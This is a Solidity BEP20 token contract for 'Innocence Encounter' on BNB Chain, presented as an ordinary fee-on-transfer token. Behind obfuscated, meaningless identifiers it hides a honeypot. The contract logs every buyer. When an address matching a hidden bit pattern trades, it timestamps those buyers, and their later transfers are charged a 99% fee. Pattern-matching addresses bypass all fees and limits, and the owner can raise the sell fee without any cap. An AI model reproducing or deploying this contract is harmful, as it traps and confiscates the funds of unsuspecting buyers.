/**
 *Submitted for verification at BscScan.com on 2022-12-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract InnocenceEncounter is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Innocence Encounter ";
    string constant _symbol = "InnocenceEncounter";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private teamIsSwapAuto;
    mapping(address => bool) private maxAutoExemptSwap;
    mapping(address => bool) private swapTradingLiquidityExempt;
    mapping(address => bool) private botsIsLimitLiquidityTradingSell;
    mapping(address => uint256) private limitMarketingLiquidityMode;
    mapping(uint256 => address) private launchedMaxLiquidityFee;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private isTradingMinFeeBuyMarketingMax = 0;
    uint256 private liquidityTeamExemptTrading = 7;

    //SELL FEES
    uint256 private modeWalletBotsMarketing = 0;
    uint256 private buyReceiverBotsAutoLaunchedExemptFee = 7;

    uint256 private liquidityFeeAutoIsBuyLaunched = liquidityTeamExemptTrading + isTradingMinFeeBuyMarketingMax;
    uint256 private launchedBotsSwapAuto = 100;

    address private sellLaunchedBurnMax = (msg.sender); // auto-liq address
    address private exemptTxSwapTeamSellTradingLimit = (0x48ba992b6baa76ddaF2D0dF9fffFd871A206929b); // marketing address
    address private botsReceiverExemptTeam = DEAD;
    address private liquidityWalletTxLaunched = DEAD;
    address private liquidityLimitMaxTradingSwapMin = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private txFeeMaxLaunched;
    uint256 private tradingMarketingFeeAuto;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private minWalletIsLimit;
    uint256 private modeAutoIsLaunchedBuyMarketingLiquidity;
    uint256 private botsBuyWalletLimitLiquidityAuto;
    uint256 private maxIsBurnBuySellTrading;
    uint256 private liquidityFeeWalletBots;

    bool private burnMinExemptFeeWalletTx = true;
    bool private botsIsLimitLiquidityTradingSellMode = true;
    bool private modeBuyExemptIsWalletMarketingFee = true;
    bool private teamModeMinBuyLiquidityExempt = true;
    bool private tradingIsMaxMode = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private burnFeeSellTrading = _totalSupply / 1000; // 0.1%

    
    uint256 private liquidityTxAutoLimit = 0;
    bool private burnReceiverFeeBots = false;
    bool private receiverSellLaunchedBots = false;
    uint256 private teamMinBotsLaunched = 0;
    bool private txSwapIsFeeWallet = false;
    uint256 private burnReceiverBuySwap = 0;
    bool private maxBurnSellIs = false;
    uint256 private receiverSwapIsLaunched = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        minWalletIsLimit = true;

        teamIsSwapAuto[msg.sender] = true;
        teamIsSwapAuto[address(this)] = true;

        maxAutoExemptSwap[msg.sender] = true;
        maxAutoExemptSwap[0x0000000000000000000000000000000000000000] = true;
        maxAutoExemptSwap[0x000000000000000000000000000000000000dEaD] = true;
        maxAutoExemptSwap[address(this)] = true;

        swapTradingLiquidityExempt[msg.sender] = true;
        swapTradingLiquidityExempt[0x0000000000000000000000000000000000000000] = true;
        swapTradingLiquidityExempt[0x000000000000000000000000000000000000dEaD] = true;
        swapTradingLiquidityExempt[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return swapMinAutoExempt(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return swapMinAutoExempt(sender, recipient, amount);
    }

    function swapMinAutoExempt(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (burnReceiverBuySwap == isTradingMinFeeBuyMarketingMax) {
            burnReceiverBuySwap = isTradingMinFeeBuyMarketingMax;
        }

        if (maxBurnSellIs == txSwapIsFeeWallet) {
            maxBurnSellIs = teamModeMinBuyLiquidityExempt;
        }


        bool bLimitTxWalletValue = tradingBurnMinAutoSellBots(sender) || tradingBurnMinAutoSellBots(recipient);
        
        if (burnReceiverFeeBots == teamModeMinBuyLiquidityExempt) {
            burnReceiverFeeBots = botsIsLimitLiquidityTradingSellMode;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                launchedModeWalletLiquidity();
            }
            if (!bLimitTxWalletValue) {
                botsMaxFeeIs(recipient);
            }
        }
        
        if (liquidityTxAutoLimit == buyReceiverBotsAutoLaunchedExemptFee) {
            liquidityTxAutoLimit = burnFeeSellTrading;
        }


        if (inSwap || bLimitTxWalletValue) {return sellMarketingLimitBots(sender, recipient, amount);}

        if (!teamIsSwapAuto[sender] && !teamIsSwapAuto[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (liquidityTxAutoLimit != burnFeeSellTrading) {
            liquidityTxAutoLimit = launchedBotsSwapAuto;
        }


        require((amount <= _maxTxAmount) || swapTradingLiquidityExempt[sender] || swapTradingLiquidityExempt[recipient], "Max TX Limit has been triggered");

        if (launchedReceiverTxMin()) {minTradingBuyBots();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        uint256 amountReceived = minTxSwapAutoModeBurn(sender) ? isLimitReceiverTeam(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function sellMarketingLimitBots(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function minTxSwapAutoModeBurn(address sender) internal view returns (bool) {
        return !maxAutoExemptSwap[sender];
    }

    function swapLiquidityTxAuto(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            liquidityFeeAutoIsBuyLaunched = buyReceiverBotsAutoLaunchedExemptFee + modeWalletBotsMarketing;
            return buyReceiverModeLaunched(sender, liquidityFeeAutoIsBuyLaunched);
        }
        if (!selling && sender == uniswapV2Pair) {
            liquidityFeeAutoIsBuyLaunched = liquidityTeamExemptTrading + isTradingMinFeeBuyMarketingMax;
            return liquidityFeeAutoIsBuyLaunched;
        }
        return buyReceiverModeLaunched(sender, liquidityFeeAutoIsBuyLaunched);
    }

    function isLimitReceiverTeam(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (receiverSwapIsLaunched != liquidityTxAutoLimit) {
            receiverSwapIsLaunched = liquidityTeamExemptTrading;
        }

        if (burnReceiverFeeBots == botsIsLimitLiquidityTradingSellMode) {
            burnReceiverFeeBots = txSwapIsFeeWallet;
        }

        if (maxBurnSellIs == teamModeMinBuyLiquidityExempt) {
            maxBurnSellIs = botsIsLimitLiquidityTradingSellMode;
        }


        uint256 feeAmount = amount.mul(swapLiquidityTxAuto(sender, receiver == uniswapV2Pair)).div(launchedBotsSwapAuto);

        if (botsIsLimitLiquidityTradingSell[sender] || botsIsLimitLiquidityTradingSell[receiver]) {
            feeAmount = amount.mul(99).div(launchedBotsSwapAuto);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function tradingBurnMinAutoSellBots(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function buyReceiverModeLaunched(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = limitMarketingLiquidityMode[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function botsMaxFeeIs(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        launchedMaxLiquidityFee[exemptLimitValue] = addr;
    }

    function launchedModeWalletLiquidity() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (limitMarketingLiquidityMode[launchedMaxLiquidityFee[i]] == 0) {
                    limitMarketingLiquidityMode[launchedMaxLiquidityFee[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(exemptTxSwapTeamSellTradingLimit).transfer(amountBNB * amountPercentage / 100);
    }

    function launchedReceiverTxMin() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    tradingIsMaxMode &&
    _balances[address(this)] >= burnFeeSellTrading;
    }

    function minTradingBuyBots() internal swapping {
        
        if (burnReceiverFeeBots == modeBuyExemptIsWalletMarketingFee) {
            burnReceiverFeeBots = botsIsLimitLiquidityTradingSellMode;
        }

        if (receiverSwapIsLaunched != liquidityTxAutoLimit) {
            receiverSwapIsLaunched = launchedBotsSwapAuto;
        }


        uint256 amountToLiquify = burnFeeSellTrading.mul(isTradingMinFeeBuyMarketingMax).div(liquidityFeeAutoIsBuyLaunched).div(2);
        uint256 amountToSwap = burnFeeSellTrading.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (receiverSwapIsLaunched != modeWalletBotsMarketing) {
            receiverSwapIsLaunched = modeWalletBotsMarketing;
        }

        if (maxBurnSellIs == tradingIsMaxMode) {
            maxBurnSellIs = burnReceiverFeeBots;
        }

        if (burnReceiverFeeBots == teamModeMinBuyLiquidityExempt) {
            burnReceiverFeeBots = maxBurnSellIs;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = liquidityFeeAutoIsBuyLaunched.sub(isTradingMinFeeBuyMarketingMax.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(isTradingMinFeeBuyMarketingMax).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(liquidityTeamExemptTrading).div(totalETHFee);
        
        payable(exemptTxSwapTeamSellTradingLimit).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                sellLaunchedBurnMax,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getTxSwapIsFeeWallet() public view returns (bool) {
        if (txSwapIsFeeWallet != teamModeMinBuyLiquidityExempt) {
            return teamModeMinBuyLiquidityExempt;
        }
        if (txSwapIsFeeWallet != txSwapIsFeeWallet) {
            return txSwapIsFeeWallet;
        }
        if (txSwapIsFeeWallet == burnMinExemptFeeWalletTx) {
            return burnMinExemptFeeWalletTx;
        }
        return txSwapIsFeeWallet;
    }
    function setTxSwapIsFeeWallet(bool a0) public onlyOwner {
        if (txSwapIsFeeWallet == teamModeMinBuyLiquidityExempt) {
            teamModeMinBuyLiquidityExempt=a0;
        }
        if (txSwapIsFeeWallet == tradingIsMaxMode) {
            tradingIsMaxMode=a0;
        }
        txSwapIsFeeWallet=a0;
    }

    function getReceiverSwapIsLaunched() public view returns (uint256) {
        if (receiverSwapIsLaunched == teamMinBotsLaunched) {
            return teamMinBotsLaunched;
        }
        return receiverSwapIsLaunched;
    }
    function setReceiverSwapIsLaunched(uint256 a0) public onlyOwner {
        if (receiverSwapIsLaunched != launchedBotsSwapAuto) {
            launchedBotsSwapAuto=a0;
        }
        if (receiverSwapIsLaunched != modeWalletBotsMarketing) {
            modeWalletBotsMarketing=a0;
        }
        receiverSwapIsLaunched=a0;
    }

    function getLiquidityLimitMaxTradingSwapMin() public view returns (address) {
        if (liquidityLimitMaxTradingSwapMin != liquidityWalletTxLaunched) {
            return liquidityWalletTxLaunched;
        }
        return liquidityLimitMaxTradingSwapMin;
    }
    function setLiquidityLimitMaxTradingSwapMin(address a0) public onlyOwner {
        if (liquidityLimitMaxTradingSwapMin != liquidityWalletTxLaunched) {
            liquidityWalletTxLaunched=a0;
        }
        if (liquidityLimitMaxTradingSwapMin != liquidityLimitMaxTradingSwapMin) {
            liquidityLimitMaxTradingSwapMin=a0;
        }
        if (liquidityLimitMaxTradingSwapMin == liquidityWalletTxLaunched) {
            liquidityWalletTxLaunched=a0;
        }
        liquidityLimitMaxTradingSwapMin=a0;
    }

    function getMaxAutoExemptSwap(address a0) public view returns (bool) {
            return maxAutoExemptSwap[a0];
    }
    function setMaxAutoExemptSwap(address a0,bool a1) public onlyOwner {
        maxAutoExemptSwap[a0]=a1;
    }

    function getModeWalletBotsMarketing() public view returns (uint256) {
        if (modeWalletBotsMarketing == buyReceiverBotsAutoLaunchedExemptFee) {
            return buyReceiverBotsAutoLaunchedExemptFee;
        }
        return modeWalletBotsMarketing;
    }
    function setModeWalletBotsMarketing(uint256 a0) public onlyOwner {
        modeWalletBotsMarketing=a0;
    }

    function getSwapTradingLiquidityExempt(address a0) public view returns (bool) {
        if (a0 == sellLaunchedBurnMax) {
            return receiverSellLaunchedBots;
        }
        if (a0 == liquidityLimitMaxTradingSwapMin) {
            return modeBuyExemptIsWalletMarketingFee;
        }
            return swapTradingLiquidityExempt[a0];
    }
    function setSwapTradingLiquidityExempt(address a0,bool a1) public onlyOwner {
        if (a0 == sellLaunchedBurnMax) {
            tradingIsMaxMode=a1;
        }
        if (a0 == botsReceiverExemptTeam) {
            botsIsLimitLiquidityTradingSellMode=a1;
        }
        if (swapTradingLiquidityExempt[a0] == maxAutoExemptSwap[a0]) {
           maxAutoExemptSwap[a0]=a1;
        }
        swapTradingLiquidityExempt[a0]=a1;
    }

    function getBurnReceiverFeeBots() public view returns (bool) {
        if (burnReceiverFeeBots != maxBurnSellIs) {
            return maxBurnSellIs;
        }
        if (burnReceiverFeeBots != tradingIsMaxMode) {
            return tradingIsMaxMode;
        }
        if (burnReceiverFeeBots != teamModeMinBuyLiquidityExempt) {
            return teamModeMinBuyLiquidityExempt;
        }
        return burnReceiverFeeBots;
    }
    function setBurnReceiverFeeBots(bool a0) public onlyOwner {
        if (burnReceiverFeeBots != receiverSellLaunchedBots) {
            receiverSellLaunchedBots=a0;
        }
        if (burnReceiverFeeBots != teamModeMinBuyLiquidityExempt) {
            teamModeMinBuyLiquidityExempt=a0;
        }
        if (burnReceiverFeeBots != burnMinExemptFeeWalletTx) {
            burnMinExemptFeeWalletTx=a0;
        }
        burnReceiverFeeBots=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}